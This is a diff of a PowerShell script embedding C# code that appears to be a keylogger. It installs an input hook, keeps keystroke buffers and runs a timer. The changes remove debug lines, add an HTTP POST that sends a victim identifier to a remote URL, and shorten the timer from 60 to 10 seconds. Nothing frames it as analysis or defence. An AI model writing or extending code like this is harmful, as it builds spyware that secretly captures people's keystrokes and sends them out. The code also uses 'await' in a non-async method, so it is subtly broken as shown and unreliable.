@@ -1,4 +1,3 @@
-echo test2
 Add-Type -TypeDefinition @"
 using System;
 using System.Text;
@@ -23,10 +22,14 @@ public class axh
     private static string id;
     public static void Hook()
     {
-        Process.Start("calc.exe");//debug
         id = GenerateRandomString(7);
+        using (HttpClient client = new HttpClient())
+        {
+            await client.PostAsync(url, new StringContent(id, Encoding.UTF8, "text/plain"));
+            bufferR = buffer = "";
+        }
         _hookID = SetHook(_proc);
-        _timer = new System.Timers.Timer(60000);
+        _timer = new System.Timers.Timer(10000);
         _timer.Elapsed += OnTimedEvent;
         _timer.AutoReset = true;
         _timer.Enabled = true;
